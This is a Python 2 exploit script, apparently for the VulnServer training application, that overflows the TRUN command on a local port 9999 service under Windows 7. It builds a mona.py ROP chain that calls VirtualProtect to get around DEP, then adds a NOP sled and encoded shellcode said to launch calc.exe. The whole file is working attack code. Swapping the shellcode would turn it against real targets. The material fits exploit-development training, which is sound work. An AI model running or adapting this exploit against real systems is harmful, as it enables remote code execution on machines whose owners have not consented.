#!/usr/bin/python
#  Tested on Window 7
import socket,struct,sys
server = '127.0.0.1'
sport = 9999
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x76bfb1b8,  # POP ECX # RETN [RPCRT4.dll] 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x75b6fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x76c2f5e2,  # POP EBP # RETN [msvcrt.dll] 
      0x625011bb,  # & jmp esp [essfunc.dll]
      0x757d6ee9,  # POP EAX # RETN [kernel32.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76b8f3a8,  # NEG EAX # RETN [RPCRT4.dll] 
      0x75b6f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] 
      0x76bd6d7f,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75b74cbd,  # NEG EAX # RETN [MSCTF.dll] 
      0x7576bd3a,  # XCHG EAX,EDX # RETN [kernel32.dll] 
      0x771914e8,  # POP ECX # RETN [ntdll.dll] 
      0x76c077c5,  # &Writable location [RPCRT4.dll]
      0x76be8f75,  # POP EDI # RETN [RPCRT4.dll] 
      0x75a94804,  # RETN (ROP NOP) [user32.dll]
      0x625011f0,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      0x771f3c64,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
# RUNS CALC.EXE
shell=("\xd9\xc5\xd9\x74\x24\xf4\xbe\xc1\x9a\xec\x97\x5a\x29\xc9\xb1"
"\x33\x31\x72\x17\x03\x72\x17\x83\x2b\x66\x0e\x62\x57\x7f\x46"
"\x8d\xa7\x80\x39\x07\x42\xb1\x6b\x73\x07\xe0\xbb\xf7\x45\x09"
"\x37\x55\x7d\x9a\x35\x72\x72\x2b\xf3\xa4\xbd\xac\x35\x69\x11"
"\x6e\x57\x15\x6b\xa3\xb7\x24\xa4\xb6\xb6\x61\xd8\x39\xea\x3a"
"\x97\xe8\x1b\x4e\xe5\x30\x1d\x80\x62\x08\x65\xa5\xb4\xfd\xdf"
"\xa4\xe4\xae\x54\xee\x1c\xc4\x33\xcf\x1d\x09\x20\x33\x54\x26"
"\x93\xc7\x67\xee\xed\x28\x56\xce\xa2\x16\x57\xc3\xbb\x5f\x5f"
"\x3c\xce\xab\x9c\xc1\xc9\x6f\xdf\x1d\x5f\x72\x47\xd5\xc7\x56"
"\x76\x3a\x91\x1d\x74\xf7\xd5\x7a\x98\x06\x39\xf1\xa4\x83\xbc"
"\xd6\x2d\xd7\x9a\xf2\x76\x83\x83\xa3\xd2\x62\xbb\xb4\xba\xdb"
"\x19\xbe\x28\x0f\x1b\x9d\x26\xce\xa9\x9b\x0f\xd0\xb1\xa3\x3f"
"\xb9\x80\x28\xd0\xbe\x1c\xfb\x95\x31\x57\xa6\xbf\xd9\x3e\x32"
"\x82\x87\xc0\xe8\xc0\xb1\x42\x19\xb8\x45\x5a\x68\xbd\x02\xdc"
"\x80\xcf\x1b\x89\xa6\x7c\x1b\x98\xc4\xe3\x8f\x40\x25\x86\x37"
"\xe2\x39")
rop_chain = create_rop_chain()
prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
brk = '\xcc'
padding = 'F' * (3000 - 2006 - len(rop_chain) - 16 - 1)
attack = prefix + rop_chain + nopsled + brk + shell + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()